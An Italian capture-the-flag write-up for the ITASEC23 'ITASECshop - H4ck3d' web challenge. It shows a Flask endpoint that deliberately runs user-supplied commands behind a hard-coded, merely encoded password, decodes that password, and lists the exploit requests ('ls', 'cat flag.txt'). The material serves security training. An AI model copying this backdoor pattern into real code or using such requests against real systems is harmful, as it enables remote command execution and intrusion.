# ITASEC23 - CTF Workshop

## [web] ITASECshop - H4ck3d (5 risoluzioni)

Per risolvere la challenge, bisogna aver risolto le 2 challenge precedenti "ITASECshop - 1mln$ Flag" e "ITASECshop - Fridge Flag"

Risolte le 2 precedenti, possiamo procedere alla challenge:

La prima cosa da notare, è l'api /cats presente sul sito

```python
@app.route('/cats', methods=['GET'])
@authorize()
def cats(user:User):
    flag2 = False
    flag1 = False
    for article in user.articles:
        if flag2 and flag1: break
        if "Samsung Smart Fridge" in article.description:
            flag2 = True
        elif "1.000.000" in article.description:
            flag1 = True
    if flag1 and flag2 and request.args.get('psw') == base64.b64decode(bytes.fromhex(base64.b32decode(bytes.fromhex(cat_food.replace(" ","")).decode()).decode()).decode()).decode():
        if request.args.get('cmd') is None:
            return ""
        else:
            try:
                return subprocess.run(['./shell', request.args.get('cmd')], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=0.5).stdout.decode()
            except Exception:
                return "0_0"
    return redirect(base64.b64decode(bytes.fromhex(base64.b32decode(bytes.fromhex(compressed_cats.replace(" ","")).decode()).decode()).decode()).decode(), code=302)
```

Nella prima parte viene controllato se abbiamo comprato le prime 2 flag (e quindi risolto le challenge precedenti)
A seguito però analizziamo ciò che il codice esegue:

```python
if flag1 and flag2 and request.args.get('psw') == base64.b64decode(bytes.fromhex(base64.b32decode(bytes.fromhex(cat_food.replace(" ","")).decode()).decode()).decode()).decode():
    if request.args.get('cmd') is None:
        return ""
    else:
        try:
            return subprocess.run(['./shell', request.args.get('cmd')], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=0.5).stdout.decode()
        except Exception:
            return "0_0"
return redirect(base64.b64decode(bytes.fromhex(base64.b32decode(bytes.fromhex(compressed_cats.replace(" ","")).decode()).decode()).decode()).decode(), code=302)
```

In questo codice ci viene data la possibilità di eseguire codice da remoto, ma viene richiesta una password "segreta" da inserire per poter utilizzare effettivamente il comando:

```python
cat_food = "47 52 52 53 41 4e 4a 54 45 41 5a 54 41 49 42 58 47 51 51 44 4b 4e 4a 41 47 51 32 43 41 4e 4a 53 45 41 33 57 43 49 42 57 47 4d 51 44 47 4d 5a 41 47 59 5a 53 41 4e 5a 58 45 41 33 44 47 49 42 57 4d 51 51 44 4b 4d 4a 41 47 5a 52 43 41 4e 44 42 45 41 32 44 47 49 42 56 47 45 51 44 4d 59 52 41 47 52 51 53 41 4e 42 54 45 41 32 54 45 49 42 54 47 45 51 44 4d 4d 5a 41 47 51 33 53 41 4e 4a 57 45 41 33 54 53 49 42 56 47 55 51 44 47 4d 52 41 47 5a 52 53 41 4e 54 42 45 41 33 44 49 49 42 56 48 41 51 44 49 59 4a 41 47 59 34 43 41 4e 4a 52 45 41 32 44 4b 49 42 55 47 45 51 44 4d 59 4a 41 47 51 34 53 41 4e 5a 5a 45 41 32 47 49 49 42 57 48 41 51 44 4d 4d 52 41 47 55 33 53 41 4e 4a 57 45 41 33 44 51 49 42 57 47 51 51 44 4f 4f 4a 41 47 4d 59 43 41 4e 5a 55 45 41 32 47 47 49 42 56 47 45 51 44 47 5a 42 41 47 4e 53 41 3d 3d 3d 3d"
base64.b64decode(bytes.fromhex(base64.b32decode(bytes.fromhex(cat_food.replace(" ","")).decode()).decode()).decode()).decode()
```

In realtà la password non è cifrata/messa al sicuro in alcun modo, infatti eseguendo le operazioni inverse (O decodificando tutto con [cyberchef](https://gchq.github.io/CyberChef/))
Abbiamo che la passoword è `---P4ssw0rd$$$$$$uperSicura@@###!meaw---`, ora ci basta comporre correttamente la richiesta.

Attenzione alla codifica della password se scriviamo l'indirizzo a mano, poichè contiene caratteri come `#` che vanno [codificati](https://www.urlencoder.org/)

1. Richiesta: `/cats?psw=---P4ssw0rd%24%24%24%24%24%24uperSicura%40%40%23%23%23%21meaw---&cmd=ls`
   Da questa richiesta possiamo leggere i file che sono presenti nella cartella, e ci accorgiamo di un file flag.txt
2. Richiesta: `/cats?psw=---P4ssw0rd%24%24%24%24%24%24uperSicura%40%40%23%23%23%21meaw---&cmd=cat+flag.txt`
   Infine con questa andiamo a leggere la flag che ci verrà restituita dal server
